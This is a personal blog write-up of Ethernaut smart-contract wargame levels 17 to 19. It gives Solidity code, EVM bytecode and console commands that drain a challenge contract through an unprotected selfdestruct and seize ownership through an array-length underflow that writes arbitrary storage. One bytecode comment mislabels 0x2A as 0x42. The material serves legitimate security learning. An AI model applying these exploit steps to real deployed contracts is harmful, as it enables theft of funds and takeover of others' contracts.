---
layout: post
title:  Ethernaut challenges writeup Part IV (Challenges 17 to 19).
excerpt_separator: <!--more-->
category: DeFi
---

Continuing the saga for [Ethernaut](https://ethernaut.openzeppelin.com/) Solutions. My post for today explains how I solved challenges 17 to 19.

Enjoy!

<!--more-->

# Challenges write up

## Recovery

Another lovely level, at least for me. I really liked the idea of somehow "store" Ether into the void and later be able to recover it. The idea for this challenge is that we need to be able to calculate the address of a contract (a `SimpleToken` instance) that was created by the `Recovery` contract. I found out very quickly the concept behind this challenge because previously I thought that I needed to do the same (calculate a contract address) in challenge #14 "Gatekeeper Two".

Contract addresses are deterministically calculated, as explained in the solution using the following process:

`keccack256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).`

Based on this I implemented the contract shown in the section below and tested if it correctly calculated some addresses. For this, I created a few tokens using `generateToken` function. Once I was sure that the function to calculate addresses was correct I assumed that the lost contract address was the first one created and the nonce == 1. With the address calculated I used method `destroy` which executes `selfdestruct` returning the stored Ether to an arbitrary account.

### Further Reading

- How to calculate an Ethereum Contract's address during its creation using the Solidity language? - https://ethereum.stackexchange.com/questions/24248/how-to-calculate-an-ethereum-contracts-address-during-its-creation-using-the-so

- http://martin.swende.se/blog/Ethereum_quirks_and_vulns.html

### Solution code:

```
contract RecoveryTokens {

    constructor(address _forgottenToken, address  _recoveryAddr) public{
        address tokenAddr = _forgottenToken;
        SimpleToken(payable(tokenAddr)).destroy(payable(_recoveryAddr));
    }

}

contract SimpleToken {

  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - (_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

## Magic number

There wasn't a lot of things to do in this level more than learn the basics to write a contract in bytecode. Both links in the "Further Reading" section helped me a lot to understand a contract's low level architecture and what I had to respect to make it work. I also was lucky to find a tool like "My Ether Wallet" which allowed me to deploy RAW bytecode very quickly to perform a lot of testing.

I used the following ABI extracted from Remix to be able to deploy my bytecode:

```
Solver's ABI:

[
	{
		"constant": false,
		"inputs": [],
		"name": "whatIsTheMeaningOfLife",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
```

And here is the bytecode for my solution. the first part is the boilerplate code that deploys the actual solver which is exactly 10 OPCODES long.

```
// Solver's bytecode:

60 0A   // PUSH 0x0A
60 0C   // PUSH 0x0C
60 00   // PUSH 0x00 
39      // CODECOPY    
60 0A   // PUSH 0x0A
60 00   // PUSH 0x00
F3      // RETURN

60 2A   // PUSH 0x42
60 00   // PUSH 0x00
52      // MSTORE
60 20   // PUSH 0x20
60 00   // PUSH 0x00
F3      // RETURN 

// 0x600A600C600039600A6000F3602A60005260206000F3
```

`Calldata` used to verify this level: `0xc882d7c2000000000000000000000000a4e31315212b45283b9c593a7b46b036a903786f`

### Useful tools

- My Ether Wallet - https://www.myetherwallet.com/wallet/deploy - Allows to deploy bytecode directly without any issues.
- Ethererum Virtual Machine IO - https://www.ethervm.io/
- SolMap - https://solmap.zeppelin.solutions/

### Further Reading

- EVM bytecode Programming (Excellent!) - https://hackmd.io/@e18r/r1yM3rCCd
- Deconstructing a Solidity Contract Series - https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/

## Alien Codex

The idea of this level is that we can underflow the size of the `bytes32[] public codex` array and with that have the possibility to write in arbitrary storage slots. Based on this primitive we can overwrite `slot 0` which holds the address of the contract's owner.

I won't describe how dynamic arrays are stored in the EVM, for that you can refer to the first link in the Further Reading section which helped me a lot understanding how things worked under the hood.

To solve this level I followed these steps:

```
await contract.make_contact() // make contact to be able to execute the other functions
```

Trigger the underflow in the `codex` array:

```
await contract.retract()
```

Now if we check the storage variable which holds the array size we should see `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`.

```
await  web3.eth.getStorageAt(contract,1)
'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
```

With this step done we can write anywhere in storage simply calculating the address of the slot we want to change. I learned how to do this [here](https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte#converting-array-indices-to-addresses))

```Python
hex(2**256-keccak(0x01))

'0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'
```

Once we have the result `0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a` we can use method `revise` to write our address (plus the 0x01 from the bool variable) in the destination slot.

```
await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", "0x000000000000000000000001922e34D7d34C70Df760DF873BC6F99a10dea516E") // Overwrite storage's Slot 0 (Owner + contact bool variable)
```

### Further Reading

- Understand Solidity Storage in depth - https://enderspub.kubertu.com/understand-solidity-storage-in-depth#dynamic-size-variables
- MerdeToken: It's Some Hot Shit - https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte
- How formal verification can ensure flawless smart contracts - https://media.consensys.net/how-formal-verification-can-ensure-flawless-smart-contracts-cbda8ad99bd1
- Solidity Attack - Array Underflow - https://medium.com/@fifiteen82726/solidity-attack-array-underflow-1dc67163948a#:~:text=What%20is%20underflow%3F,is%20undefined%20in%20many%20languages.
- Pay attention to the Ethereum hash collision problem from the "Stealing coins" incident - https://xlab.tencent.com/en/2018/11/09/pay-attention-to-the-ethereum-hash-collision-problem-from-the-stealing-coins-incident/
